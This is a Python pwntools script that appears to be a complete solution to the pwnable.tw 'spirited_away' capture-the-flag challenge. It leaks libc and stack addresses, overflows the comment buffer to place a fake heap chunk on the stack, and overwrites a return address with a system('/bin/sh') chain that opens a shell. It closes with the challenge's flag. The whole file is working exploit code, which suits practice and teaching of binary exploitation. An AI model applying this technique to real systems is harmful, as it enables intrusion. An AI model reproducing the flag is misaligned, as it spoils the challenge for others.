#!/usr/bin/env python3

from pwn import *

exe = ELF("./spirited_away_patched", checksec = False)
libc = ELF("./libc_32.so.6", checksec = False)
ld = ELF("./ld-2.23.so", checksec = False)

context.binary = exe


def conn():
    if args.REMOTE:
        r = remote("chall.pwnable.tw", 10204)
    else:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    return r

r = conn()
def survey(name, reason, comment):
    r.sendafter(b'name: ', name)
    r.sendlineafter(b'age: ', b'2')
    r.sendafter(b'movie? ', reason)
    r.sendafter(b'comment: ', comment)
def survey1(reason):
    r.sendafter(b'age: ', b'1\n')
    r.sendafter(b'movie? ', reason)
input()
# Leak libc
survey(b'B', b'A'*0x14 + b'BBBB', b'B')
r.recvuntil(b'BBBB')
libc_leak = u32(r.recv(4))
libc.address = libc_leak - 0x675e7
info('Libc leak: ' + hex(libc_leak))
info('Libc address: ' + hex(libc.address))
pause()
system = libc.sym.system
binsh = next(libc.search('/bin/sh'))
info('System: ' + hex(system))
info('/bin/sh address: ' + hex(binsh))
# pause()
r.sendafter(b'<y/n>: ', b'y')


# Leak stack
survey(b'AAA', b'A'*0x38, b'AAAA')
r.recvuntil(b'Reason: ')
r.recv(0x38)
stack_leak = u32(r.recv(4))
info('Stack leak: ' + hex(stack_leak))
# pause()
r.sendafter(b'<y/n>: ', b'y')

# Overflow size60
for i in range(8): 
    survey(b'A', b'A', b'A')
    r.sendafter(b'<y/n>: ', b'y')


for i in range(90): 
    survey1(b'A')
    r.sendafter(b'<y/n>: ', b'y')
# pause()
fake_chunk = stack_leak - 0x68
comment = b'A'*0x54 + p32(fake_chunk)
reason = p32(0) + p32(0x41) + b'A'*0x38 + p32(0) + p32(0x11)
survey(b'fucalors', reason, comment)
r.sendafter(b'<y/n>: ', b'y')
# pause()
name = b'A'*0x4c + p32(system) + p32(0) + p32(binsh)

survey(name, b'\0', b'\0')
# pause()
r.sendafter(b'<y/n>: ', b'n')
# pause() 
# good luck pwning :)
r.interactive()

# FLAG{Wh4t_1s_y0ur_sp1r1t_1n_pWn}